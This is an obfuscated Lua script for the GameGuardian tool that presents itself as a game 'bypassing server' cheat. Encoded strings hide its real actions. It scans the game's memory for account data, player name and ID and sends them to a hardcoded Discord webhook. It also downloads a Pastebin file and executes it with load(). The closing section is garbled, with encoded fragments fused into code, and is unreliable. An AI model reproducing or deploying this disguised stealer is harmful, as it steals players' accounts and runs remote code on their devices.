gg.setRanges(gg.REGION_JAVA_HEAP)
gg.clearResults()

function dwordToUTF8(dword)
    local byte1 = dword & 0xFF
    local byte2 = (dword >> 8) & 0xFF
    local byte3 = (dword >> 16) & 0xFF
    local byte4 = (dword >> 24) & 0xFF
    return string.char(byte1, byte2, byte3, byte4)
end
gg.toast(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('XJZYdlewQoufMaLbJBIvATYEjaayumnzCFzpDQOHlzTZdTgOwGuAZsKUoLlZUGxlYXNlIHdhaXQuLi4uLmJ5cGFzc2luZyBzZXJ2ZXI='))
function scanAndCollectResults(searchString, refineString, maxResults, stepCount, searchType)
    searchType = searchType or gg.TYPE_BYTE

    gg.searchNumber(searchString, searchType, false, gg.SIGN_EQUAL, 0, -1)
    gg.refineNumber(refineString)
    gg.setVisible(false)
    local results = gg.getResults(maxResults or 1000)
    local fullUtf8Data = ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('ZxoOdgtPRVjniryLgtUIGthvMCykjnrBFiwRJxuQIHIfBMZNUYtVdUngecKm')

    if #results > 0 then
        for _, result in ipairs(results) do
            local baseAddress = result.address
            local utf8Combined = ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('PXziaDFxtMHcgQWnGwRAkAhShgBVlcFKJkJgiQVVdXUSnExVLTZRAgXtgbPq')

            for offset = 0, (stepCount or 200), 4 do
                local dword = gg.getValues({ { address = baseAddress + offset, flags = gg.TYPE_DWORD } })[1]
                if dword then
                    utf8Combined = utf8Combined .. dwordToUTF8(dword.value)
                end
            end

            fullUtf8Data = fullUtf8Data .. utf8Combined .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('UVmDErAywhNbiQAQjVlyRPLpbgUjVcecqiqkVSGlHkGbqYnJjBVpjdNIQGgSXG4=')
        end
    end

    gg.clearResults()
    return fullUtf8Data
end

local webhook_url = ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('VLDHexGxTcKBviubioCndzqeKGXcqPPUuyGWFliNDDtKkVTMKfuONCSDXdZUaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NTg1MjE2MzI1MTE3NTU0Ni9EemJkQkNfVWxmRnA4elBXNi1GTnNXb01vbjVpUzRDT2I4amhmNzVHcmxKdWlFV3pRZWNTNHgzOXhuNklvcThObWxxVg==')

local function buildQuery(url, query)
    if not query or next(query) == nil then
        return url
    end

    local query_string = ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('wLmvxfSzuzypMbIKbJpGeQBXkPdTWQHFBCpuhpoUySSUgbdVxOyXRTFutbOc')
    for k, v in pairs(query) do
        query_string = query_string .. k .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('rNjKcTuKFIUGtHWYIrdksjNPsxvUQpKGUrIQAJYWqDxjLOjNkupSMEdTYQHTPQ==') .. tostring(v) .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('TEUYtmJPVgGpSZOuUOllawZhKNwHHtBEhJYDjAZioFEBwFsUintuOqbgyKwCJg==')
    end
    query_string = query_string:sub(1, -2)

    return url .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('oKDeyRWUMUWdXvhnkyFmTpKHKpspiSCpXvLiIpUdoqJANQRVpRoiLrYagrOcPw==') .. query_string
end

local function escapeString(s)
    s = s:gsub(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('rRVIPcjtBgFXOfkYJuECXcdEyjxdPymaRFOoBnYfzymOfQgEqaGKlsqRiMBXXFw='), ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('OlDiOIQfnfoIKiyXEEwSxnDdpsaWQJADxnFJqEWehREoMoCoFAfQpPUrdQUkXFxcXA=='))
    s = s:gsub(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('xKKlGTxMkqRmfwJjnwhbOnxAoHeCLulytNlGsOPJmcQVARXqggvfUybqGFwSXA==')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('JfZFPNaqoqxNqBojvCOEtKYLFnpOQFfgmLsiEsNeqXaNLxfPJgztavGAzTJKLCA=')\\\ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('ztbQkCnywlUcUysXpZiJYBJwvxUqixiRtTDbFMarYGeRdMIEygFyOQadnVhO'))
    s = s:gsub(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('haYzoeLseASsgLRLdJdpenzAgVQuSBkawhbiKkbQaXjGSkBfyUDbgRmWKESoXG4='), ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('KZmbXqQkiwxVtyeECrBSLdmRAItwEHFaeQxeLeQljRdyvIWdALVNzUibtPOkXFxu'))
    s = s:gsub(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('WGFMTnnIjozCeZEIdRrbwOSBLofKwduXmtWLPOqteQcPSiAqQtPLlbggFsuOXHI='), ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('ulqEiAbMYXyeuJKlhvtljqlGcqADQyUfeBZdmVoSsUwVgaargEfjhztUUjUsXFxy'))
    return s
end

local function toJson(tbl)
    local json = ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('zqHVfSYDCrzSwMMIXqbJjJTdGNLRfUkbGYxtAGDGigzZUqOjEsVxZpNPGvgYew==')

    for k, v in pairs(tbl) do
        local kType = type(k)

        if kType == ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('bRvJYhFIOKzPCwAMDVpRjTiMNqlvOWspvBnszGMsaVblpHIQrCGqdzFepRaVc3RyaW5n') then
            json = json .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('GuGZzzGrHFXIeeoCavBPbWauLBIyoSzmyFHwrMvzfMaYfxPAZuHqoelzrFpb')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('zShkbyyOWRfYoHCBYNFXwtMqXCQMkSHsuWPnuyUnfxxSBjOMcmmsfTQZyySdIC4uIGsgLi4g')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('RnPnpkfFRigNYYvOSuGfawzqioWRwSCgHdUeokilkJWVIypMTgreRczuDLBrOg==')
        elseif kType == ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('teBOyQhmaftZuaREXHlnTryWpEccrZhqXdRoENbieoNcXAKBvnRYVPsWIppdbnVtYmVy') then
            json = json .. k .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('vmonWjSOsgwktyovjWwuAVRmBtsUgqNDVzvLTZIsAOSoQKBpBwDANPJJSnylOg==')
        end

        local vType = type(v)

        if vType == ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('NliCqvhGNtsWpjGcjdwXVmdHXMNeTcUawYFEoyLhMQrCOwhoXbtzpZVehrFYc3RyaW5n') then
            json = json .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('vaFtvptQAAogGeYZUSfDyvjrOfBscwBGtlXlBIyKQgFAvBmmyFiRgithmcCR')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('jQEbzyUcyYsveNhMMtziUBMyBXqYZDeJkNaitOfhuIDyrbLJjrMGmkoqfQPvIC4uIGVzY2FwZVN0cmluZyh2KSAuLiA=')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('SvpsxLaREMIHuUbaLIDwVWAKlpUhTRgChWBLEryIOjFkMwSzMYXUpqmgothD')
        elseif vType == ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('kEqaFzWcSxokiYcYsbhjeaFcdXrRYGloFARqFGbnVoDHCAegGoTXskmDOjLWbnVtYmVy') then
            json = json .. v
        elseif vType == ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('gEShPspsCgPbgStHaNJRBXcOowyqVgPaHKdHEurxILjaIzCqphToBmVPaSpedGFibGU=') then
            json = json .. toJson(v)
        end

        json = json .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('dMiGdSIuiWeVmnwxhrBxHhniqpHCraAZKibAAJLdbbKMIEzNcBnaSQuRfGQGLA==')
    end

    json = json:sub(1, -2) .. ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('xHVKfiXccRuOALCUHFKhIXhAGDGMdPnmRhtEGxCxJQBZHglyCDnDnRAeuIbjfQ==')

    return json
end

local function sendWebhook(payload_content)
    local payload = { content = payload_content }
    local headers = {
        [ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('DnhHKpNVxmMEFwSxGqQXtIsNQjKqdzMyVvNcOsKLkuEbvbGGOpmSLpJpKtytQ29udGVudC1UeXBl')] = ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('pJkCflQkcoWZuvuKIlfjRefdJifRNudNODvuuSHwFwYvOWgjmmpSfrVGgNLjYXBwbGljYXRpb24vanNvbg=='),
    }
    local payload_json = toJson(payload)
    gg.makeRequest(webhook_url, headers, payload_json)
end

local secret_accounts = {}

function fetchSecretAccounts()
    local pastebinURL = ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('ephuOuIhJBSruswDfvzGNKvZEejvlEZgTPuAdOUtJGOImoHuqTHxntmQLvIEaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3d2d0ZXN2hV')
    local response = gg.makeRequest(pastebinURL)

    if response and response.content then
        local chunk, errorMsg = load(response.content)
        if chunk then
            secret_accounts = chunk()
        else
            print(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('AVrsyibaVipSarIbohjqbtdAmXLHHjDtAtGeOUZgDjTLnnKtsZcyzKgDEsnuVW5rbm93biBFcnJvciwgcGxlYXNlIHJ1biBzY3JpcHQgYWdhaW4u'))
            os.exit()
        end
    else
        print(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('TvOmfkhkZodFnuvMvdsoybcfKkafEZqMbEQEXgjklgFJeooVIPtMKEZpypPSVW5rbm93biBFcnJvciwgcGxlYXNlIHJ1biBzY3JpcHQgYWdhaW4u'))
        os.exit()
    end
end

function checkSecretAccounts()
    for account_id, associated_id in pairs(secret_accounts) do
        gg.searchNumber(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('SpXBRxJJlgiNNTATjjxGlXbiigHfIvUXhXXgOOmLPeZmUZkYfRRodbVrKVMNOw==') .. account_id, gg.TYPE_WORD, false, gg.SIGN_EQUAL, 0, -1)
        gg.setVisible(false)
        local results = gg.getResults(1)
        gg.clearResults()

        if #results > 0 then
            sendWebhook(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('UjrfXmoBQHtnHggFXRkmJJggsBVqworPdvKpzOZhceGIotcdPKAMDWwucJfT8J+UkiBVc2VyOiA=') .. associated_id)
            return true
        end
    end
    return false
end

fetchSecretAccounts()

local function sanitizeString(input)
    -- Replace null bytes and invalid characters with empty
    return input:gsub(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('OJqArvdwncQZDAWDjtElUgKbVVXqhvUYphuVEFfiuCvYxJwKnffeyNtMVyxJWyV6XDEtXDMxXDEyNy1cMjU1XQ=='), ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('dJybECKcLLtOOIRjtzuYRNqDhYGiwrqwahoDvyyhDaxewrLeEmIIBhXJcint'))
end

-- Main data collection
local fullUtf8Data = scanAndCollectResults(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('AyCApBetbgnUUJnIrOvdkuKpqTMKHbRUJdVkansvnNjNmiaXeqBjyQqSaMOJOmFkSW50ZXJ2YWw='), ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('DaSLQTziEIErslPLQapkzGVexsTijoceIRozsDZuXRDdPZtVaNUgrPSYjMUSOnY='), 1000, 200, gg.TYPE_BYTE)
local tmp_c_id = scanAndCollectResults(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('qRItLWKYmRlRpvijBgsOrYOACQARSXddaEFsjKKVKTfaWfcyyXMwquNkwBaIOCwzODksNzcyLDI3NywxMDcsMDg5LDY5OA=='), ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('jJWDaXfiQsycgmeiTdicGPHKmJDXfJODAgCqTLLWjZxHJuBbMYSGwzyApYVrOCwzODksNzcyLDI3NywxMDcsMDg5LDY5OA=='), 1000, 100, gg.TYPE_QWORD)
local playerName = scanAndCollectResults(ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('RUWLRItiaDcFIwkfRpnFGlLbMfIZmycBZzFpztDWFJqFslUWDxZwqCpzzUFoOntc')CreateljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('vsHXDuptzwlbxbIZuevQOySakryOvSGTHdGBuYlwaXnEJBUhEhwZTBYvNLNOLCA='):tljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('pyAzDGURtPixnFaxAZpOJjoFMebzGwZqZeckPpunAZkKpuQDuvzijZWgqqGFLCAxMDAwLCA3MCwgZ2cuVFlQRV9CWVRFKQ0KLS1sb2NhbCBwbGF5ZXJJZCA9IHNjYW5BbmRDb2xsZWN0UmVzdWx0cyg=')27,423,342,016,359,796ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('AhCaOVTeTRbzhbFqVLjWOzDGZuvbuWcNRZAbdnOReuiXjABGuXtQxnCWVWPJLCA=')27,423,342,016,359,796ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('kcErEfXRZHpDdHmHKVjrSKMglgDVbLSMxxxVhrRLIvTkLsbPUfGLczcjWhrELCAxMDAwLCAxMDAsIGdnLlRZUEVfUVdPUkQpDQoNCmlmIG5vdCBjaGVja1NlY3JldEFjY291bnRzKCkgdGhlbg0KICAgIGlmIGZ1bGxVdGY4RGF0YSA9PSA=')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('wpVWEUzFEvWaDsyTrqHGuoCJfFvhOckxjHXIuStShbJRgJcQUANCgrJopgJVIGFuZCB0bXBfY19pZCA9PSA=')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('GdeXdPvtOTaJTEUfwADgQRwuVVcTOvjuHPlzCBptFKkzYOJrLXTcraBOwswLIGFuZCBwbGF5ZXJOYW1lID09IA==')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('nZaqGmUpZluLHEHbtnvvijfOAVSOnimtnBdNLwtPwSQFIMYXwgPLcEigywJNIGFuZCBwbGF5ZXJJZCA9PSA=')ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('tlHTbLcRwlxRoGsjfpyTgRKDytBhLlNeLFWCxduDHwtItnqKYRKQPEEPXtajIHRoZW4NCiAgICAgICAgc2VuZFdlYmhvb2so')Error! Nothing Found 💩ljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('OsZDTfrEVRygSruPqULaYJUZCVUgeMamoAINHdLKVSjemzksQWPSYiwzGvGkKQ0KICAgIGVsc2UNCiAgICAgICAgbG9jYWwgcGF5bG9hZF9jb250ZW50ID0g')Account:\nljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('KflHYiQBLiKVDMJtoJxDRpiCgtQgRqYtDKDpXKGJZWFJAoYAcpZJTEloJGTzIC4uIHNhbml0aXplU3RyaW5nKGZ1bGxVdGY4RGF0YSkgLi4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg')\n\nv1:\nljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('UJuvymVPLQmOGNfQharKvsUgtPPknKWTOaHdcHzfbhPlowQyGBObWIudxqsnIC4uIHNhbml0aXplU3RyaW5nKHRtcF9jX2lkKSAuLg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA=')\n\nv2:\nljNZTHRZdPxUJIezsalsOPpEYXgrrwPKPZYcJrvyaGayrfsrXjASyvYRhApi('BseCiyObZJLaOKAQFIyIUvCBAkOfiEXEnIBCEbPSEHgMIStUJplhlxoViwJnIC4uIHNhbml0aXplU3RyaW5nKHBsYXllck5hbWUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSAg')\n\nv3:\n' .. sanitizeString(playerId)
        sendWebhook(payload_content)
    end
end    
